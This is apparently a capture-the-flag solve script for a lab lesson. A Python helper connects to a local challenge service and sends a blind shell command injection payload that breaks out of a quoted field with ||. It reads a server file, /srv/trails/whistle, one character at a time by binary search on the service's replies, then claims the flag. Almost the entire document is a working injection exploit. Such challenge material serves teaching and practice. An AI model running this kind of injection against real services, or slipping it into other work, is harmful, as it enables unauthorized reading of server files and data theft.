#!/usr/bin/env bash
# Lesson 3: infer the whistle from command exit statuses before claiming it.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30003}"
flag=$(python3 - "$host" "$port" <<'PY'
import re
import socket
import sys

host, port = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((host, port), timeout=10)
s.settimeout(150)

def until(marker):
    data = b""
    while marker not in data:
        chunk = s.recv(4096)
        if not chunk:
            raise SystemExit("solve: connection closed")
        data += chunk
    return data

s.sendall(b"3\n")
until(b"Path probe (or !claim WORD):")
letters = "abcdefghijklmnopqrstuvwxyz"
word = ""
for position in range(1, 5):
    lo, hi = 0, 25
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f'''x' || [ "$(cut -c{position} /srv/trails/whistle)" \\> "{letters[mid]}" ] #'''
        s.sendall((payload + "\n").encode())
        reply = until(b"Path probe (or !claim WORD):")
        if b"Boone sits." in reply:
            lo = mid + 1
        else:
            hi = mid
    word += letters[lo]
s.sendall(("!claim " + word + "\n").encode())
reply = until(b"noco{")
while not (match := re.search(rb"noco\{[^}\r\n]+\}", reply)):
    reply += s.recv(4096)
print(match.group().decode())
PY
)
[[ -n "$flag" ]] || { echo "solve: no flag from $host:$port" >&2; exit 1; }
echo "$flag"
